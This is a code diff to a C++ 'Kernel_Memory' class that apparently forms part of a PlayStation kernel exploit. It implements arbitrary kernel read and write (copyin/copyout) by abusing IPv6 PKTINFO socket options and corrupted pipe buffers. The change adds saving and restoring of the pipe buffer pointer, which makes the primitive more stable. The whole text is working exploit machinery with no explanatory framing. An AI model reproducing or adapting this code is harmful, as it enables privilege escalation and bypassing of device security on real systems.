@@ -19,13 +19,18 @@ class Kernel_Memory
         int32_t rw_sd = -1;
         int32_t pipes[2] = {-1, -1};
         ptr64_t pipe_p = 0; // &pipe.pipe_buf
+        ptr64_t pipe_buffer = 0; // pipe_buf.buffer backup
         uint8_t addr_buf[0x14] = {0};
         uint8_t data_buf[0x14] = {0};
         uint8_t rw_buf[0x14] = {0};
 
     public:
         // Initialize the Kernel Memory.
-        Kernel_Memory(int32_t head_sd, int32_t rw_sd, int32_t *pipes, ptr64_t pipe_p)
+        Kernel_Memory(
+            int32_t head_sd, int32_t rw_sd,
+            int32_t *pipes, ptr64_t pipe_p,
+            ptr64_t pipe_buffer = 0
+        )
         {
             if (head_sd < 0 || rw_sd < 0 || !pipes || !pipe_p) {
                 printf_debug("Kernel_Memory: Invalid parameters!\n");
@@ -37,10 +42,11 @@ class Kernel_Memory
             this->pipes[0] = pipes[0];
             this->pipes[1] = pipes[1];
             this->pipe_p = pipe_p;
+            this->pipe_buffer = pipe_buffer;
             // Maximize .size
             *(uint32_t*)(this->data_buf + 0x0c) = 0x40000000;
         }
-        
+
         // Copy data from userland to an arbitrary kernel address
         void copyin(void *src, ptr64_t dst, size_t len)
         {
@@ -69,6 +75,12 @@ class Kernel_Memory
             );
 
             PS::write(pipes[1], src, len);
+
+            // Restoring .buffer
+            *(uint64_t*)data_buf = pipe_buffer;
+            PS::setsockopt(
+                rw_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf, sizeof(data_buf)
+            );
         }
 
         // Copy data from an arbitrary kernel address to userland
@@ -99,20 +111,19 @@ class Kernel_Memory
             );
 
             PS::read(pipes[0], dst, len);
+
+            // Restring .buffer
+            *(uint64_t*)data_buf = pipe_buffer;
+            PS::setsockopt(
+                rw_sd, IPPROTO_IPV6, IPV6_PKTINFO, data_buf, sizeof(data_buf)
+            );
         }
-    
+
     private:
         void _read(ptr64_t addr)
         {
             PS2::memset(rw_buf, 0, sizeof(rw_buf));
-            *(uint64_t*)rw_buf = addr;
-            PS::setsockopt(
-                head_sd, IPPROTO_IPV6, IPV6_PKTINFO, rw_buf, sizeof(rw_buf)
-            );
-            socklen_t len = sizeof(rw_buf);
-            PS::getsockopt(
-                rw_sd, IPPROTO_IPV6, IPV6_PKTINFO, rw_buf, &len
-            );
+            copyout(addr, rw_buf, 8);
         }
 
         void _write(ptr64_t addr, uint64_t value, size_t len)
@@ -121,7 +132,7 @@ class Kernel_Memory
             PS2::memcpy(rw_buf, &value, len);
             copyin(rw_buf, addr, len);
         }
-    
+
     public:
         uint8_t read8(ptr64_t addr)
         {
